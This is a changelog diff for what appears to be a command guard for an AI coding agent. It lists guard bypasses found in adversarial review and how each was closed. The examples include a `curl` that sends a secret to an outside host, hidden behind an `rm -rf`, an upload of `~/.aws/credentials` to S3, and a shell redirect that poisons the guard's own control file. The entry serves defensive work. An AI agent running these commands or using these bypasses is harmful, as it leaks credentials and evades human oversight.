@@ -21,6 +21,31 @@ Versioning follows [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   silence. Motivated by the 2025–2026 `nx` / Shai-Hulud npm worms, whose postinstall
   scripts harvested cloud keys and exfiltrated data from victims' S3 buckets.
   Regression test: `test_cloud_upload_to_bucket_in_source_still_asks_no_silent_allow`.
+- **Closed a batch of guard bypasses found in adversarial review** (each previously
+  reached a silent `allow` or a masked `deny`):
+  - **Cloud-upload detection was too narrow.** `aws --region … s3 cp`, `aws s3api
+    put-object`, `gsutil` with a value-taking flag, `s3cmd`, and `rclone …remote:`
+    all slipped through — the most common real form (`aws --region … s3 cp`) bypassed
+    the whole "cloud uploads prompt" guarantee. Detection now tolerates global flags
+    between the tool and its subcommand and covers those tools/verbs.
+  - **Cloud-to-cloud copy** (`aws s3 cp s3://src s3://dst`) was silent (no local
+    token) — now flags the destination bucket.
+  - **Compound-command deny masking.** `_classify_bash` returns on the first match,
+    so `rm -rf ~/x && curl -d "$(cat secret)" https://absent/` returned the `rm` ASK
+    and never reached the exfil DENY. The inline-capture-exfil and credential-file-
+    upload denies are now evaluated up front, before any ASK tier.
+  - **Control-file poisoning via shell redirect.** `echo … > .clawness/guard_sessions.json`
+    (or the provenance cache) bypassed the Write-tool control-file gate because it goes
+    through Bash — it could silence the ask-ledger or launder a host to "trusted." A
+    `>`/`>>` redirect targeting a control file now asks.
+  - **Uploading a local credential file to cloud storage** (`aws s3 cp
+    ~/.aws/credentials s3://…`) now DENIES, matching the curl cred+network deny (the
+    cloud CLIs aren't in `_NETWORK_RE`, so they previously only asked).
+  - **Bare `$TOKEN`/`$KEY`/`$SECRET`** (no underscore prefix) in a call to an absent
+    host are now routed through provenance like `$GITHUB_TOKEN` was (`$MONKEY`-style
+    false matches stay excluded).
+  - **`pwsh -enc`** (PowerShell 7) added to the encoded-command download-cradle check
+    (was `powershell`-only).
 
 ## [0.7.0] - 2026-07-03
 
